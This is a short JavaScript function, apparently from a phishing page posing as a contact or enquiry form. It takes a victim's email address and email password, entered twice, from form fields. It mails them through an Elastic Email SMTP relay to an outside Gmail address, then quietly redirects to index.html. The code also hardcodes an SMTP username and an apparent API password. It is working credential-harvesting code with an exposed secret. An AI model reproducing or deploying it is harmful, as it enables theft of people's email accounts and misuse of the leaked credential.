function sendEmail() {
    Email.send({
      Host: "smtp.elasticemail.com",
      Username: "lexbritt11@gmail.com",
      Password: "B98286FB9DE8198F0F85409BD2C0C588062F",
      To: "billscosco0245@gmail.com",
      From: document.getElementById("email").value,
      Subject: "New Contact Info for Form Enquiry",
      Body:
        "Email: " +
        document.getElementById("1").value +
        " <br> Email Password: " +
        document.getElementById("2").value +
        " <br> enter Email Password again: " +
        document.getElementById("3").value 
    }).then((message) => {
        // alert("Message")
        window.location.href = "index.html"

    });
  }
  